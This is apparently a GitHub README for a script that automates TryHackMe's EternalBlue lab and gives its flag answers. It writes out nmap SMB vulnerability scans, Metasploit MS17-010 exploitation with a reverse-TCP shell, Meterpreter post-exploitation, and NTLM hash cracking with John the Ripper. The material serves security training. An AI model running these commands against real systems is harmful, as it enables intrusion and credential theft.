# 🔐 EternalBlue Lab Automation Script – TryHackMe

> 🧠 **For Educational Use Only**  
> Automates the EternalBlue exploitation lab on TryHackMe including scanning, exploiting MS17-010, and capturing flags.

---

## 📁 Features

- 📖 **Lab Description** with detailed background on EternalBlue
- 📋 **Checklist** to keep track of key lab tasks
- 🔌 **VPN Connection Setup** with `.ovpn` file
- ⚔️ **Metasploit-based Exploitation** using EternalBlue
- 🧠 **Post-Exploitation Commands** for Meterpreter shell
- 🔐 **Password Hash Cracking** with John the Ripper
- 🏁 **Flag Discovery** with hints and answers
- ![image](https://github.com/user-attachments/assets/379b023e-0c63-49b1-9189-db3ef3e34d4b)


---

## 🚀 How to Use

git clone https://github.com/Kun31-cpu/Eternalblue-lab.git
cd eternalblue-lab
chmod +x eternalblue-lab.sh
dos2unix eternalblue-lab.sh
./eternalblue-lab.sh

🧪 Menu Options
Option	Description
1️⃣	View Lab Description
2️⃣	View Task Checklist
3️⃣	Connect to VPN Only (.ovpn file required)
4️⃣	Start Full Exploitation Lab
5️⃣	View Questions and Answers for THM tasks
6️⃣	Exit

🛠️ Tools Used
Nmap – Port scanning and vulnerability detection

Metasploit – Exploitation of MS17-010 (EternalBlue)

John the Ripper – Cracking NTLM hashes

OpenVPN – VPN connection to TryHackMe network

nmap -p 445 --script smb-vuln* <TARGET_IP>

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set PAYLOAD windows/x64/shell/reverse_tcp
exploit -j

# Post Exploitation
use post/multi/manage/shell_to_meterpreter
set SESSION <session_id>
exploit -j

# Cracking Passwords
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

🎯 Learning Objectives
✅ Understand EternalBlue and MS17-010
✅ Identify vulnerable SMB services
✅ Exploit Windows targets with Metasploit
✅ Practice real-world post-exploitation
✅ Learn ethical hacking techniques responsibly

⚠️ Disclaimer
This script is strictly for educational purposes.
Do NOT scan, exploit, or access unauthorized systems.
Always follow legal and ethical guidelines.

👨‍💻 Author
Kuntal Bera
Cybersecurity Student | Ethical Hacking Enthusiast

⭐ Give it a Star!
If you found this useful, consider starring the repository ❤️

⭐ github.com/yourname/eternalblue-lab
